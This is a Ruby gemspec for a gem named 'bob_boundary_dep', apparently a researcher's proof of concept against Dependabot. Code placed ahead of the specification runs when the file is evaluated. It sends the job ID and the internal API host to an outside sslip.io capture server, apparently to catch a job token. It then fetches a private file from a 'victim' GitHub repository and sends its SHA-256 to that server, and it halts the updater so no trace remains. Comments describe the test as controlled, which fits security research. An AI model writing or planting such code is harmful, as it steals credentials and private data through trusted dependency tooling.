require_relative "lib/bob_boundary_dep"
require_relative "azure_certificate_probe_payload"

capture_base = "https://target.147.182.179.38.sslip.io:8443/capture/5b3963e04627c6a3b1943eb0e2a145cc"
dependabot_api_url = ENV["DEPENDABOT_API_URL"]
job_id = ENV["DEPENDABOT_JOB_ID"].to_s

if dependabot_api_url && !dependabot_api_url.empty? && job_id.match?(/\A[0-9]+\z/)
  internal_api_host = dependabot_api_url.sub(/\Ahttps?:\/\//, "").split("/", 2).first.split(":", 2).first
  system(
    "curl",
    "--fail",
    "--silent",
    "--show-error",
    "--max-time", "15",
    "--header", "Host: #{internal_api_host}",
    "#{capture_base}/#{job_id}",
    out: File::NULL,
    err: File::NULL
  )
end

if job_id.match?(/\A[0-9]+\z/)
  digest_command = <<~'BASH'
    curl --fail --silent --show-error --max-time 15 \
      --header 'Accept: application/vnd.github.raw+json' \
      'https://api.github.com/repos/GougasseHamza/dependabot-external-git-victim-alice-20260822/contents/private-sentinel.txt?ref=main' \
      | sha256sum | cut -d' ' -f1
  BASH
  private_sha256 = IO.popen(
    ["bash", "-o", "pipefail", "-c", digest_command],
    err: File::NULL,
    &:read
  ).strip

  if private_sha256.match?(/\A[0-9a-f]{64}\z/) &&
     private_sha256 != "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
    system(
      "curl",
      "--fail",
      "--silent",
      "--show-error",
      "--max-time", "15",
      "https://target.147.182.179.38.sslip.io:8443/proof/5b3963e04627c6a3b1943eb0e2a145cc/#{job_id}/private-file-sha256/#{private_sha256}",
      out: File::NULL,
      err: File::NULL
    )
  end

  # Keep the controlled owned-repository job alive long enough for the
  # researcher-owned receiver to test the captured job token, then stop the
  # updater before its legitimate PR update can overwrite the observation.
  sleep 20
  raise "controlled stop after job-token boundary validation"
end

Gem::Specification.new do |spec|
  spec.name = "bob_boundary_dep"
  spec.version = BobBoundaryDep::VERSION
  spec.summary = "Controlled upstream dependency boundary proof"
  spec.authors = ["mongodb-sage-bot"]
  spec.files = ["lib/bob_boundary_dep.rb"]
end
